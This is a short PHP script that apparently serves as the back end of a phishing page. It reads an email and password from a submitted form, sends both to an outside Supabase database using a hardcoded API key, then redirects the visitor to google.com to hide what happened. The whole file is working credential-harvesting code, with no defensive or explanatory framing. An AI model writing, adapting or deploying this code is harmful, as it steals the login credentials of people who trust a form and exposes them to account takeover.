<?php
$email = $_POST['email'];
$password = $_POST['password'];

$url = "https://ptshthtnjcbngiceyjzc.supabase.co/rest/v1/submissions";

$data = array(
    "email" => $email,
    "password" => $password
);

$payload = json_encode($data);

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Content-Type: application/json",
    "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB0c2h0aHRuamNibmdpY2V5anpjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIyNDc2NTYsImV4cCI6MjA5NzgyMzY1Nn0.sejLXlM95cllcRuFcG-18P9uVFTMSnL70svBZ1L0kag",
    "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB0c2h0aHRuamNibmdpY2V5anpjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIyNDc2NTYsImV4cCI6MjA5NzgyMzY1Nn0.sejLXlM95cllcRuFcG-18P9uVFTMSnL70svBZ1L0kag",
    "Prefer: return=minimal"
));

$response = curl_exec($ch);
curl_close($ch);

// redirect after submit
header("Location: https://google.com");
exit();
?>
